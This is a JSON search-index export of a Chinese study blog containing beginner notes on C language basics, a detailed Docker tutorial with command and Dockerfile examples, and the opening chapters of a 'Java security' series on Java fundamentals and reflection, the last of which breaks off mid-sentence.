[{"title":"C🤪🤪🤪","url":"/2022/05/19/C%F0%9F%A4%AA%F0%9F%A4%AA%F0%9F%A4%AA/","content":"没有前言…\n​    面向过程：C；\n​    面向对象：C++，java，C#，objective-c；\n​    C 语言是一种程序设计语言，具有高级语言的特点，有具有低级语言的特点，简洁灵活，使用方便，运用广泛。\nhelloworld#include &lt;stdio.h&gt;int main(int argc, const char * argv[]) &#123;    // insert code here...    printf(&quot;Hello, World!\\n&quot;);    return 0;&#125;\n\n​    stdio.h 系统库文件； #include导入头文件的预编译指令； &lt;&gt;系统自带的库； “”先搜索用户自定义库，再搜索系统库； main主函数，程序入口，只有一个。\n\nC的数据类型\n整形​    整数，没有小数点的数，整型的值可以是整数、负数或者是0，但必须是整数。一般占4个字节（32位），取值范围是-21~=21亿。\n​    包括短整型、整型和长整型。Short int  long int(两者的 int 可以省略，单用 short 和 long 表示)\n浮点型​    也叫实型，带有小数的数。C 语言中浮点包括 float 和 double 类型\n​    系统的默认类型是 double，float 类型可精确表示的数字个数为78位，double 类型为1617。（各操作系统一记编译器不同）\n​    表示小数的形式：2^10  ^并不表示阶乘 而是表示位运算\n字符型char​    (用于表示字符)在计算机中使用二进制的 ASCII 码来存储\n​    表现形式:用一对单引号括起来的单个字符‘a’(“ asd”字符串)\n​    需注意数字是否有符号，以确定其范围。\n\n常量和变量​    常量：在程序执行过程中取值不可变的量称常量\n整型常量​    a)分为十进制，八进制 十六进制常量\n​    b)八进制以整数0开头，用0-7表示数据\n​    c)十六进制以0x 开头，用0-9和 ABCDEF 来表示数据\n实际常量\n​    d)十进制方式表示（0.123）\n​    e)指数形式表示（10.123e5）\n字符型常量\n​    f)计算机用 ascll 码的形式来保存字符\n​    g)使用单引号来表示（‘a’）\n​    范例：A ——字符；1 ——数字；“abc”——字符串\n字符串常量\n​    h)用双引号括起来的字符序列（“hello”）\n​    i)转义字符：是特殊字符常量，起控制作用，在输出界面不显示\n\n\n\n转义字符\n作用\n\n\n\n\\a\n响铃（BEL）\n\n\n\\b\n退格(BS)\n\n\n\\f\n换页（FF）\n\n\n\\n\n换行（LF）\n\n\n\\r\n回车（CR）\n\n\n\\t\n水平制表（HT）\n\n\n\\v\n垂直制表（VT）\n\n\n\\\\\n反斜杠\n\n\n?\n问号字符\n\n\n\\‘\n单引号字符\n\n\n\\“\n双引号字符\n\n\n​    注意，在内存单元中，如果按abc连续存储则指示单个的字符序列，而字符串都是以\\0结尾的。字符串比看到的所占的内存单元多一个。\n符号常量​    符号常量：用一个标识符来代表的常量\n​    在使用之前要先定义，格式如下：# define 符号常量名 常量，用空格分隔，常量后面不加分号，例子：#define PI 3.141592653\n​    符号常量的好处:1)书写程序时简单，不易出错；2)修改时方便；3)增加程序可读性(很明显 PI 表示圆周率)；4)符号常量习惯使用大写字母，例如：#define CLASSNUMBER 9\n​    举例：\n#include &lt;stdio.h&gt;#define CLASSNUMBER 9int main(int argc, const char * argv[]) &#123;    // insert code here...    printf(&quot;dancer say:\\&quot; 今天是 %d 号 \\n&quot;,CLASSNUMBER);    return 0;&#125;\n\n标识符​    标识符是用户编程时通过 C 语言的字符为变量以及函数等指定的名字。我们制定某个东西，都要用到它的名字；在数学中解释方程时，我们也常常用到这样那样的变量名或函数名。\n​    标识符定义规则：字母数字下划线组成，首字母不能是数字，一般小写开头，特殊的除外，不能取名与关键字相同。\n关键字​    在 C 中保留又称关键字，它们是系统已经预先定义好的词，在 C 语言中，有着特殊的含义。\n​    可分其为数据类型关键字，控制语句关键字，存储类型关键字和其他关键字四类。\n​    数据类型关键字：char(2)double(3)enum(4)float(5)int(6)long(7)short(8)signed(9)struct(10)union（11）unsigned(12)void\n​    控制语句关键字：\nfor(2)do(3)while(4)break(5)break(6)if(7)else(8)goto(9)switch(10)case(11)default(12)return\n​    存储类型关键字:\nauto(2)extern(3)register(4)static\n​    其他关键字：\nconst(2)sizeof(3)typedef(4)volatile\n格式化输入输出​    格式化输入函数：scanf\n​    从标准输入流中获取参数值，实现标准化输入。用scanf()读取基本变量类型的值，在变量名前加＆scanf(“%d%d”,&amp;a,&amp;b);\n​    输入函数的作用：从终端设备内将部分信息通过键盘、鼠标、画笔的方式传入到CPU、电脑中。当我们想将一个数字输入到内存中时，内存中同样也需要一片区域以供我们使用、保留数字的区域，故应定义一个存放数据的变量。\n#include &lt;stdio.h&gt;int main(int argc, const char * argv[]) &#123;    int num1 = 0;    char num2 = 0;        scanf(&quot;%d&quot;,&amp;num1);    scanf(&quot;\\n%c&quot;,&amp;num2);    printf(&quot;num1 = %d&quot;,num1);    printf(&quot;num2 = %c&quot;,num2);    return 0;&#125;\n\n​    字符输入：getchar（）\n​    输入字符以回车结束，函数读取回车前的字符\n​    使用方法：char c=getchar();printf(“%c”,getchar());\n格式控制符–格式化输出函数​    格式化输出函数：printf\n​    可使用printf（）将数据显示在屏幕上，如：printf (“%d\\n”,day) ;\n​    格式：\n​    printf（“‘格式控制字符串”（%d %f %s %c），参数列表…）\n​    以上字符会对不同类型进行相应的输出，用逗号隔开需要输出的参数列表。参数列表即需要打印的数据。可以放多个。而多个参数列表也用逗号隔开。\n​    printf并非与用户交互的工具，是一种调试手段-暴力调试，且仅作为一种调试方式。不管程序对错依然按部就班运，运用时会出现无法规避的问题。此时也可使用另一种断点调试，此调试优于暴力调试，程序会停在错误处。\n​    前期入门时需要了解 printf，但后期几乎不会使用。在后台查看到数据错误时，呈现给用户的同样也是错误值，存在程序崩溃的风险。还有一种断点调试，更优选。优化于暴力调试，会在数据错误处停止，以便于观察到详细错误。可随时监听，便于更改。\n​    %d十进制有符号整数\n​    %u十进制无符号整数\n​    %f浮点数 (单精度)  float\n​    %lf浮点数 (双精度) double\n​    %.5lf显示时保留小数点后5位\n​    %s字符串\n​    %c单个字符\n​    %p指针的值\n​    %e指数形式的浮点数\n​    %x以十六进制表示的整数\n​    %0以八进制表示的整数\n​    %%输出%    \n\n运算符和表达式算术运算符和赋值运算符​    略\n自加自减运算符​    自增自减运算符只能作用于整形变量以及字符型变量，不能作用于常量或运算表达式\n复合赋值运算符​    a+=b，a=a+b\n​    &lt;表达式&gt;？a：b\n关系运算符​    优先级从高到低：\n​    ！逻辑  优先级最高\n​    算数运算符\n​    关系运算符:==、&gt;=、&lt;=、!=\n​    逻辑运算符:&amp;&amp;、||、!\n​    赋值\n逗号运算符和sizeof​    逗号运算符（又称顺序求值运算符）：可以把表达式链接起来，整个逗号表达式的值为最后一个表达式的值。一般形式为：表达式1，表达式2，表达式3……表达式n（运算结果为表达式n的值）。逗号运算符的优先级是所有运算符中最低的。\n​    sizeof（）运算符：以字节形式给出了其操作数的储存大小。\n​    1.用于数据类型\n​    sizeof使用形式：sizeof（int）\n​    数据类型必须用括号括住：sizeof（char）\n​    2.用于变量\n​    sizeof使用形式：sizeof（a）\n​    sizeof操作符不能用于函数类型，不完全类型或位字段。（不完全类型指具有未知存储大小的数据类型）void\n​    sizeof（）直接参与运算：int i=10；i*sizeof(int)\n类型转换​    当混合不同类型的数据进行计算时，便会发生类型转换。当不同类型的数据进行计算时,应当首先将操作数转换成相同类型数据,然后再进行计算。\n​    转换形式分为:隐式类型转换,显式类型转换。\n​    转换是因为从计算机内存角度来说，整形和浮点内存存储结构是不一样的，计算机必须保证两个数据是一样的才能去运算，所以必须转成一样的。\n​    方法是：低精度向高精度转换，\n​    隐式转换：自动转换，不需要手动转换。\n​    显式转换：浮点转成整数运算。\n​    隐式类型转换:编译器自动完成转\n​    换规则为:由低级向高级转换\n​    隐式类型转换:编译器自动完成。1.短字节向长学节看齐(char int)；2.有符号,向无符号看齐(unside int)；3.整形向浮点型看齐；4.单精度向双精度看齐\n 显式类型转换:又叫强制类型转换,直接将某数据转换为指定类型。直接在要转换的数据前,用括号加需要强制的类型\n\n​    a=(int)1.6，将1.6强制转换为整形,赋值给ab=c+(int)x将变量的值临时转换为整形，但变量x在系统中的值不变.\n​    比如 a（1.23456）本来是一个浮点，对 a 进行强制转换 （int）a 编译器在处理数据的时候会取变量 a 里面的整数位， 但是a 不会发生变化。\n\n","categories":["C语言学习基础篇"],"tags":["C","开发","数据结构"]},{"title":"DockerDocker😝","url":"/2022/05/14/DockerDocker%F0%9F%98%9D/","content":"​    dockerdocker🥳\ndocker介绍docker背景​    以前开发和运维部署之间会有因环境问题而产生的分歧，Docker之所以发展的如此迅速，是因为它对此给出了一个标准化的解决方案：安装的时候，将环境也一同复制过来。docker的镜像设计,使得docker得以打破过去的程序及应用的观念。透过镜像讲作业系统核心除外，运作应用程序所需要的系统环境，由下而上打包，达到跨平台无缝运作。\n\ndocker理念​    Docker基于go语言实现，基于Linux的容器技术发展过来，只要配置好一次环境，换到其他的机器上一键部署好，大大简化了操作。\n\ndocker要素​    之前的虚拟化技术：虚拟机技术，在操作系统里面运行操作系统，缺点是开启时间长，容量大。\n​    因为这些缺点：Linux发展出另一种虚拟化技术:Linux容器。Linux容器不是模拟一个完整的操作系统，而是对进程进行隔离。有了容器，就可以将软件所需要的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑操作系统，只需要软件工作所需的资源库和设置。系统因此高效轻量并且在任何环境中都可以始终如一的运行。\n​    Docker特征：1、镜像；2、容器；3、仓库。\n​    Docker特点：1、容器的应用进程直接运行于宿主的内核，容器内没有自己的内核,并且也没有进行硬件虚拟；2、每个容器之间相互隔离，每个容器有自己的文件系统，容器进程不会相互影响，能区分计算资源。\n\n​    Docker镜像（Image）就是一个只读的模版。镜像可以用来创建docker容器，一个镜像可以创建很多容器。\n​    容器与镜像的关系类似于面向对象编程中的对象于类。\n\n\n\nDocker\n面向对象\n\n\n\n容器\n对象\n\n\n镜像\n类\n\n\n​    Docker利用容器（Container）独立运行的一个或一组应用。容器使用镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。可以把容器看作一个简易版的Linux环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。容器的定义和镜像很像，唯一区别在于容器最上面那一层是可读可写的。\n​    Docker仓库(Repository)是集中存放镜像文件的场所。仓库分为公开仓库和私有仓库。\n\nDocker相关Docker安装​    安装方式：https://developer.aliyun.com/article/765545\nDocker运行底层​    Docker是一个C/S结构的系统，Docker守护进程运行在主机上，然后通过Socket链接从客户端访问，守护进程从客户端接收命令并管理运行在主机上的容器。容器是一个运行时环境。\n\n​    docker有着比虚拟机更少的抽象层，docker不需要hypervisor实现硬件虚拟化，docker使用的都是实际物理机器的资源。\n​    docker利用的是宿主机的内核，而不需要Guest OS。因此当新建一个容器时，docker不需要和虚拟机一样重新加载一个操作系统内核。而新建虚拟机需要加载这个，这个是分钟级别的。\n\n\nDocker常用命令docker帮助命令​    docker version、docker info、docker –help\ndocker镜像命令​    docker images：\ndocker images //列出本地所有镜像docker images -a //列出本地所有镜像（含中间映像层）docker images -q //只显示镜像IDdocker images --digests //显示镜像的摘要信息docker images --no-trunc //显示完整的镜像信息\n\n​    docker search：\n​    方法一：dockerhub网站\n​    方法二：\ndocker search tomcat //查询镜像docker search --no-trunc tomcat //显示完整信息\n\n​    docker pull：\ndocker pull tomcat:latest\n\n​    docker rmi：\ndocker rmi tomcat:latestdocker rmi -f tomcat:latestdocker rmi -f tomcat nginxdocker rmi -f $(docker images -qa)//全删\n\ndocker容器命令docker run [options] image [command][arg...]options选项：--name=&#x27;容器新名字&#x27;：为容器指定一个名称-d：后台运行容器，并返回容器ID，也即启动守护式容器-i：以交互模式运行容器，通常与-t同时使用-t：为容器重新分配一个伪输入终端，通常与-i同时使用-P（大写）：随机端口映射-p：指定端口映射，有以下模式：\tip:hostPort:containerPort\tip::containerPort\thostPort:containPort\tcontainerPort\tdocker run -it centos//启动并提供交互进入容器\n\ndocker ps [OPTIONS]options选项：-a：列出当前所有正在运行的容器+历史上运行过的-l：显示最近创建的容器-n：显示最近n个创建的容器-q：静默模式，只显示容器编号--no-trunc：不截断输出\n\nexit 容器停止推出ctrl+P+Q 不停止\n\ndocker start 容器名或iddocker stop 容器名或iddocker kill 容器名或id，强制docker rm 容器名或iddocker rm -f 容器名或id，强制docker rm -f $(docker ps -a -q)docker ps -a -q | xargs docker rm\n\n​    注意：docker run -d 镜像这样的启动方式在docker ps是查询不出来的\n​    此时我们使用docker ps  -l查看，会发现容器已经退出了\n\n​    很重要的要说明的一点：Docker容器后台运行，就必须有一个前台进程。容器运行的命令如果不是那些一直挂起的命令（比如运行top，tail），就是会自动退出的。\n​    这个是docker的机制问题，比如你的web容器，我们以niginx为例，正常情况下，我们配置启动服务只需要启动响应的service即可，例如service niginx start。但是，这样做nginx为后台进程模式运行，就导致docker前台没有运行的应用，这样的容器后台启动后，会立即自杀因为他觉得他没事可做了，所以最佳的解决方案是，将要运行的程序以前台进程的形式运行。\ndocker logs -f -t --tail 容器ID -t 是加入时间戳-f 跟随最新的日志打印--tail 数字 显示最后多少条\n\n​    照前文所说，容器被杀死的原因是没有前台进程，那我们运行以下这句：\ndocker run -d centos /bin/bash -c “while true;do echo hello hello;sleep 2;done”\n​    可以发现，docker容器已经不会被杀死，并且查询日志，会一直返回hello hello。\ndocker top 容器ID //查看容器内运行的进程docker inspect 容器ID //查看容器内部细节，以json数据返回docker exec -it 容器ID bashshelldocker attach 容器ID //也是进入容器\n\n​    attach和exec不同的是，attach直接进入容器启动命令的终端，不会启动新的进程。exec是在容器中打开新的终端，并且可以启动新的进程。\ndocker exec -t 10 ls -l /tmp //直接执行docker exec -it 10 /bin/bash\n\ndocker cp 容器ID:容器内路径 目的主机路径 //从容器内拷贝文件到主机上\n\n\nDocker镜像Docker镜像原理​    Docker镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变了和配置文件。\n​    UnionFS(联合文件系统)：Union文件系统是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下。Union文件系统时docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像(没有父镜像)，可以制作各种具体的应用镜像。 特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。\n​    docker镜像加载原理：docker镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。     bootfs(boot file system)主要包含bootloader和kernel，bootloader主要是引导加载kernel，Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成后整个内核就都在内存之中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。    rootfs(root file system)，在bootfs之上，包含的就是典型Linux系统中的/dev，/proc ，/bin，/etc等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，CentOS等等。\n​    对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供rootfs就行了。由此可见对于不同linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以共用bootfs。\n​    分层的镜像：以pull为例，我们看到的docker镜像是一层一层在下载，以tomcat为例，需要底层的jdk，centos系统再到kernel，所以这一层一层的共同凑出400多mb。\n​    \n​    docker采用这种分层系统的原因最大的一个好处就是可以共享资源。比如：有多个镜像都从相同的base镜像构建而来，那么宿主机只需要在磁盘上保存一份base镜像，同时内存中也只需加载一份base镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。\n​    docker镜像特点：docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称为“容器层”，“容器层”之下的都叫“镜像层”。\n\nDocker镜像commit​    docker commit提交容器副本使之成为一个新的镜像\n​    docker commit -m=”提交的描述信息” -a=”作者” 容器ID 要创建的目标镜像名:[标签名]\n案例演示：\n​    1、下载tomcat镜像到本地并成功运行 \ndocker run -it -p 8080:8080 tomcat //-p:主机端口:容器端口\n\n​    2、删除容器内的docs文档（只凸显和原版本不同即可）\ndocker exec -it ID /bin/bashrm -f docs/\n\n​    3、目前的就是没有doc文档的tomcat，以他为模版commit一个没有doc的tomcat新镜像mes9s0/tomcat02\ndocker commit -a=&quot;mes9s0&quot; -m=&quot;tomcat without docs&quot; c3 mes9s0/tomcat02:1.2\n\n​    4、此时images就有我们自己的images了\n\n\nDocker容器数据卷docker容器数据卷介绍​    docker容器在启动后，我们对于某些数据修改的要求是希望持久化的，容器之间希望有可能共享数据。如果我们不commit生成新的，那么容器删除，数据就没有了。为了能够保存数据，我们使用卷。\n​    卷就是目录或文件，存在于一个或多个容器，由docker挂载到容器，但不属于联合文件系统，因此能够绕过UnionFS提供一些用于持续存储或共享数据的特性。卷的设局目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在删除容器时删除其挂在的数据卷。\n​    特点：1、数据卷可以在容器之间共享或重用数据；2、卷中的更改可以直接生效；3、数据卷中的更改不会包含在镜像的更新中；4、数据卷的生命周期一直持续到没有容器使用它为止。\n​    数据卷容器内添加：1、直接命令添加；2、DockerFile添加\ndocker容器数据卷用v命令添加docker run -it -v /宿主机绝对目录路径:/容器内目录 镜像名docker run -it -v /myDataVolume:/dataVolumeContainer centos//注意哪怕没有这两个路径也是会自动创建的，并且可读可写docker run -it -v /宿主机绝对目录路径:/容器内目录:ro 镜像名 //只读\n\ndocker inspect 容器ID //可以看到绑定成功\n\n\n​    绑定后的两个文件夹实现完全同步，注意，在容器停止后，修改宿主机上的目录，然后重启容器，容器内关联文件夹也是会同步的。\n​    在命令加了ro后，只允许宿主机单向写，容器内只能看。\n\ndocker容器数据卷用DockerFile添加​    dockerfile是docker images镜像的描述文件。添加有如下步骤\n根目录下新建mydocker文件夹并进入mkdir mydocker可在Dockerfile中使用volume指令来给镜像添加一个或多个数据卷VOLUME[&quot;/dataVolumeContainer&quot;,&quot;/dataVolumeContainer2&quot;,&quot;/dataVolumnContainer3&quot;]\n\n​    出于可移植性和分享的考虑，用-v主机目录:容器目录这种方法不能够直接在Dockerfile中实现。因为不能保证宿主机都存在以上的特定目录。\nFile构建cd mydockervi Dockerfile\n\n\nbuild后生成镜像docker build -f /mydocker/Dockerfile -t mess9s0/centos .run容器\n\n\n通过上述步骤，容器内的卷目录地址已经知道对应的主机目录地址在哪，随机生成的主机对应默认地址docker inspect 容器ID\n\n\ndocker容器数据卷volumes-from​    命名的容器挂在数据卷，其他容器通过挂载这个(父容器)实现数据共享，挂载数据卷的容器，称之为数据卷容器。\n​    先启动一个父容器mes9s01,在dataVolumeContainer2新增内容mess01\ndocker run -it --name mes9s01 97\n\n​    mes9s02/mes9s03继承自mes9s01,可以看到直接有mess01文件\ndocker run -it --name mes9s02 --volumes-from mes9s01 97docker run -it --name mes9s03 --volumes-from mes9s01 97\n\n\n​    现在有三个容器，1位父容器，2，3为子容器，他们的数据均可以互通，此时我们删除容器1，然后在容器2修改文件，可以观察到3可以继续被同步。\n\n\n\n​    结论：容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止。\n\nDockerFiledockerfile是什么​    dockerfile是用来构建docker镜像的构建文件，是由一系列命令和参数构成的脚本。\n​    回顾前面通过dockerfile添加容器数据卷时的操作，目前可分为三部：1、手动编写dockerfile文件；2、有了文件后，直接docker build命令执行，获得一个自定义的镜像；3、run\ndockerfile解析过程​    dockerfile内容基础知识：\n​    1、每条保留字指令都必须为大写字母且后面要跟随至少一个参数。2、指令按照从上到下，顺序执行。3、#表示注释。4、每条指令都会创建一个新的镜像层，并对镜像进行提交。\n​    docker执行Dockerfile的大致流程：1、docker从基础镜像运行一个容器；2、执行一条指令并对容器作出修改；3、执行类似docker commit的操作提交一个新容器；4、docker再基于刚提交的镜像运行一个新容器。5、执行dockerfile中的下一条指令直到所有指令都执行完成。\n​    从不同的角度看，docker是软件的原材料，docker镜像是软件的交付品，docker容器则可以认为是软件的运行态。dockerfile面向开发，docker镜像称为交付标准，docker容器则涉及部署与运维，三者缺一不可。\n\ndockerfile保留字指令​    FROM：基础镜像，当前新镜像是基于哪个镜像的\n​    MAINTAINER：镜像维护者的姓名和邮箱地址\n​    RUN：容器构建时需要运行的命令\n​    EXPOSE：当前容器对外暴露出的端口\n​    WORKDIR：指定在创建容器后，终端默认登陆的进来工作目录，一个落脚点\n​    ENV：用来在构建镜像过程中设置环境变量，例如：\n​    ENV MY_PATH /usr/mytest，这个环境变量可以在后续的任何RUN指令中使用，这就如同在命令前面制定了环境变量前缀一样；也可以在其它指令中直接使用这些环境变量。比如：WORKDIR $MY_PATH\n​    ADD：将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包\n​    COPY：类似ADD，拷贝文件和目录到镜像中。将从构建上下文目录中&lt;源路径&gt;的文件/目录复制到新的一层的镜像内的&lt;目标路径&gt;位置\nCOPY src destCOPY [&quot;src&quot;,&quot;dest&quot;]\n\n​    VOLUME：数据容器卷，用于数据保存和持久化工作\n​    CMD：指定一个容器启动时要运行的命令；Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换\n​    ENTRYPOINT：指定一个容器启动时要运行的命令；ENTRYPOINT的目的和CMD一样，都是在指定容器启动程序及参数\n​    ONBUILD：当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后父镜像的onbuild被触发\ndockerfile案例-自定义镜像mycentos​    Base镜像(scratch)：dockerhub中99%的镜像都是通过在base镜像中安装和配置需要的软件构建出来的\n​    自定义镜像mycentos：1、编写；2、构建；3、运行；4、列出镜像的变更历史\n​    1、编写：hub中默认的centos是没有vim、没有ifconfig的，我们让其带这两个功能\nFROM mes9s0/centosMAINTAINER mes9s0ENV mypath /tmpWORKDIR $mypathRUN yum -y install vimRUN yum -y install net-toolsEXPOSE 80CMD echo &quot;success--------ok&quot;CMD /bin/bash\n\n​    2、构建：docker build -t 新镜像名字:TAG .\n​    注意，此时最新的是centos8的docker镜像，但是已经停止服务了，进入容器执行以下命令修改。\ncd /etc/yum.repos.d/sed -i &#x27;s/mirrorlist/#mirrorlist/g&#x27; /etc/yum.repos.d/CentOS-*sed -i &#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27; /etc/yum.repos.d/CentOS-*yum update -y\n\ndocker build -f /mydocker/Dockerfile2 -t mycentos:1.3 .\n\n\n​    可以看到已经生成了新的镜像\n\n​    3、运行，可以看到新的镜像已经有vim和ipconfig了\n\n​    4、列出镜像的变更历史\ndocker history 镜像ID\n\ndockerfile案例-CMD-ENTRYPOINT命令案例首先看CMD和ENTRYPOINT，都是指定一个容器启动时要运行的命令。\ndockerfile中可以有多个CMD命令，但只有最后一个生效，CMD会被docker run之后的参数替换。\n我们以tomcat为例看看执行,会显示dockerfile里环境变量底下的ls -l命令，而覆盖掉启动命令，所以tomcat启动不起来。\ndocker run -it -p 8888:8080 tomcat ls -l\n\n\nENTRYPOINT则是在docker run之后的参数会被当作参数传递给ENTRYPOINT，之后形成新的命令组合。\nFROM mes9s0/centosRUN yum install -y curlCMD [ &quot;curl&quot;,&quot;-s&quot;,&quot;http://www.baidu.com&quot; ]\n\ndocker build -f /mydocker/Dockerfile3 -t curlbaidu .docker run -it curlbaidu\n\n\nFROM mes9s0/centosRUN yum install -y curlENTRYPOINT [ &quot;curl&quot;,&quot;-s&quot;,&quot;http://www.baidu.com&quot; ]\n\ndocker run -it morebaidu -i\n\n\n​    可以发现使用ENTRYPOINT的命令不会被覆盖，相当于执行curl -s http://www.baidu.com -i\ndockerfile案例-ONBUILD命令​    这是dockerfile5，为父镜像的dockerfile\nFROM mes9s0/centosRUN yum install -y curlENTRYPOINT [ &quot;curl&quot;,&quot;-s&quot;,&quot;http://www.baidu.com&quot; ]ONBUILD RUN echo &quot;father onbuild---------886&quot;\n\n​    这是子容器的dockerfile，dockerfile6，直接FROM 父类的新的images,可以看到触发器被执行。\nFROM newbaidu_fatherRUN yum install -y curlCMD [ &quot;curl&quot;,&quot;-s&quot;,&quot;http://www.baidu.com&quot; ]\n\n\ndockerfile案例-自定义的tomcat9FROM mes9s0/centosMAINTAINER mes9s0#把宿主机当前上下文的c.txt拷贝进容器/usr/local路径下COPY c.txt /usr/local/cincontainer.txt#把java与tomcat添加到容器中ADD jdk-8u202-linux-x64.tar.gz /usr/local/ADD apache-tomcat-9.0.63.tar.gz /usr/local/#安装vimRUN yum -y install vim#设置工作访问时候的WORKDIR路径，登陆落脚点ENV MYPATH /usr/localWORKDIR $MYPATH#配置java与tomcat环境变量ENV JAVA_HOME /usr/local/jdk1.8.0_202ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV CATALINA_HOME /usr/local/apache-tomcat-9.0.63ENV CATALINA_BASE /usr/local/apache-tomcat-9.0.63ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin#容器运行时监听的端口EXPOSE 8080#启动时运行tomcat#ENTRYPOINT [&quot;/usr/local/apache-tomcat-9.0.63/bin/startup.sh&quot;]#CMD [&quot;/usr/local/apache-tomcat-9.0.63/bin/catalina.sh&quot;,&quot;run&quot;]CMD /usr/local/apache-tomcat-9.0.63/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.63/bin/logs/catalina.out\n\n总结\n​    最后，如果上述都能看懂的话，docker的基础操作基本就是这些，再加上把自身生成的镜像推送到阿里云或者dockerhub等等即可，按着指示就行。docker基础差不多就到这里，后面会再去学习k8s、逃逸等的相关知识。\n","categories":["Docker学习基础篇"],"tags":["Docker","容器"]},{"title":"Java安全从零到一(1)-Java语言基础","url":"/2022/03/15/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-1-Java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/","content":"写在前面：如果你能有幸看到文章并且有所收获，那也是我的一份荣幸，文章所有均为个人观点，不能保证正确性，错误的地方还望师傅们指点，感谢🙏\n关于该系列：Java安全相信网上资料已经很多了，本人也阅读过许多相关文章，但均为零零碎碎不成体系的阅读，对于Java源码的阅读与审计能力还是差的太多(看源码的时候头发都挠掉了也看不懂)，看着别人的各种分析文章也非常羡慕他们的审计能力，所以决定写从零开始重学Java（从基础java开发开始），代码还得自己写，光看永远不会，可能会有很多Java安全用不到的开发知识，算是本人积累复习了吧也，希望能有所收获。\nJava运行​    Java语言程序(.java)需要先编译成字节码文件(.class)，后经过JVM进行解释文件。所有*.java的源代码程序最终都是需要经过编译后才可以使用的，但是编译造成的程序代码并不是绑定在某个具体操作系统上的程序，而是一种通用性的程序，而这种通用性的程序就是JVM所能够识别的代码。通过JVM执行，肯定比直接在操作系统上处理要慢，所以会存在JVM调优问题。\nJava类基础​    Javac编译，然后在JVM上进行程序的解释执行: java Hello.解释的时候不需要加.class后缀,mac下回到项目目录java -cp . 路径\n\n\n\n​     “public class类名称{}” ：类名称必须与文件名称保持一致，一个*.java_文件里面只允许有一个public class定义,主方法所在的类为主类，由此定义。\n​     “class类名称{}”:类名称可以与文件名称不一致，但是编译后的.class名称是class定义的类名称，解析的时候要求解析的是生成的.class文件名称，在一个*.java文件里面可以有多个class定义，并且编译之后会形成不同的*.class文件。\nJava环境变量​     PATH:是操作系统提供的路径配置，定义所有可执行程序的路径；\n​    CLASSPATH:是由JRE提供的，用于定义Java程序解释时类加载路径，默认设置的类当前所在目录加载，可以“SET=CLASSPATH=路径”的命令形式来进行定义；-关系：JVM →CLASSPATH的定义的路径→加载字节码文件。\n​    ps.关于JDK版本管理，Jenv工具很好用，一行命令切换版本。\nJava数据类型​    在Java语言之中对于数据类型一共分为两类:\n​    1、基本数据类型：描述的是一些具体的数字单元，例如：1、1.1；\n​    可分为以下几类：\n​    数值型：\n​    整型：byte、short、int、long；            默认值：0\n​    浮点型：float、double；                         默认值：0.0\n​    布尔型：boolean；                                   默认值：false\n​    字符型：char；                                          默认值：’\\u0000’\n​    2、引用数据类型：牵扯到内存关系的使用；\n​    重点有以下三种类型：\n​    数组、类、接口。                                      默认值：null\n​    真正复杂的部分就是引用数据类型，引用数据类型需要通过许多实例加以说明。而每一种数据类型都有默认值，其默认值如上。\n​    数字首选int (整数),double(小数);二进制处理操作(byte);中文char;描述内存或文件大小、描述表的主键列（自动增长）可以使用long。\nJava运算符，逻辑控制，方法等​    对于返回值而言就可以使用Java中数据定义类型。（包含基本数据类型，引用数据类型）在方法之中可以进行返回数据的处理。如果要返回数据则可以使用return。 return所返回的数据类型与方法的返回值类型相同，如果不返回数据，则该方法上可以使用void进行说明。\n​    在进行方法名称定义的时候要求第一个单词的字母小写，而后每个单词的首字母大写。变量名称和方法名称是一样的规则。例:public static void testFuncation(){}\n​    随便看看即可，不细致写了，到处都是。\n","categories":["Java安全基础篇"],"tags":["开发","Java","安全"]},{"title":"Java安全从零到一(4)-Java反射机制","url":"/2022/10/04/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-4-Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","content":"Java反射机制​    对于Java反序列化漏洞来说，Java反射机制必须理解，本章专门用来说明什么是Java反射。\n\n什么是Java反射​    Java 反射机制允许运行中的Java程序获取自身的信息, 操作类和对象的内部属性。\n​    Java 反射机制是指在程序运行时，对于任何一个类，都能知道这个类的所有属性和方法，对于任何一个实例对象 , 都能调用该对象的任何一个属性和方法。\n​    Java中这种 “ 动态获取信息 “ 和 “ 动态调用属性方法 “ 的机制被称为 Java 反射机制。\n​    实例对象可以通过反射机制获取它的类 , 类可以通过反射机制获取它的所有方法和属性 . 获取的属性可以设值 , 获取的方法可以调用。\n在静态语言中 , 